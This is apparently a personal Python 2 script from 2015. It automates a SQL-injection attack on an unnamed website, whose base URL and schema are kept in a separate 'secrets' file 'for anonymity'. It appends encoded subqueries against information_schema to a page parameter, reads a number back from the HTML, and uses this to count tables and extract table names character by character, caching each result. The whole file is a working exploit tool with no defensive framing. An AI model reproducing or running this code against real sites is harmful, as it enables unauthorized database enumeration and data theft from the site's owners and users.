#!/usr/bin/env python

'''

@Author : Biswanath 
@Date   : 29th Aug, 2015

base id 27454 - 1
end  id 27553 - 100

'''
import urllib2
from bs4 import BeautifulSoup
import shelve
# secrets is kind of config file for anonymity 
# pull base url, schema kind of stuff
import secrets

db=None

def wrapped_execution(original_function):
    def new_function(*args,**kwargs):
        try:
            global db
            db=shelve.open('cache')
            original_function(*args,**kwargs)
        finally:
            db.close()

    return new_function

def hard_cache(original_function):
    def new_function(*args,**kwargs):
        key= original_function.__name__
        for arg in args:
            key = key + str(arg)
        #print "Key : " + key
        if key not in db:
            out = original_function(*args,**kwargs)
            #print out
            db[key] = out 
        return db[key]

    return new_function

basei=27453

@hard_cache
def getInt(url):
    content = urllib2.urlopen(url).read()
    soup = BeautifulSoup(content)
    content = soup.select('.content > div[align="left"] > font > b')
    name = content[0].string
    return int(name[6:].strip())

'''
all table count 88 in the schema
'''
@hard_cache
def tableCount():
    cust ="(select%2027453%2B(SELECT%20COUNT(*)%20FROM%20information_schema.tables%20limit%201%20))"
    url = secrets.base + cust
    return getInt(url)

'''
table count in schema 29 
'''
@hard_cache
def tableCountInSchema():
    cust ="(select%2027453%2B(SELECT%20COUNT(*)%20FROM%20information_schema.tables%20where%20table_schema=%27{0}%27%20limit%201%20))".format(secrets.schema)
    url = secrets.base + cust
    return getInt(url)

@hard_cache
def getTableLength(i):
    cust ="(select%2027453%2B(SELECT%20length(table_name)%20FROM%20information_schema.tables%20where%20table_schema=%27{0}%27%20order%20by%20table_name%20limit%20{1},1))".format(secrets.schema,i)
    url = secrets.base + cust
    return getInt(url)

@hard_cache
def getTableNameCharAt(i,j):
    cust ="(select%2027453%2B(SELECT%20ascii(substr(table_name,{1}))-50%20FROM%20information_schema.tables%20where%20table_schema=%27{0}%27%20ORDER%20BY%20TABLE_NAME%20limit%20{2},1))".format(secrets.schema,str(j),str(i))
    url = secrets.base + cust
    #print url
    return getInt(url)

@hard_cache
def getTableName(iTable):
    nameLength=getTableLength(iTable)
    name =""
    for i in range(1,nameLength+1):
        name = name + str(unichr(50+getTableNameCharAt(iTable,i)))

    return name

@wrapped_execution
def main():
    print "starting " 
    for i in range(0,tableCountInSchema()):
        print getTableName(i)
    print "Finished "


if __name__ == '__main__':
    main()

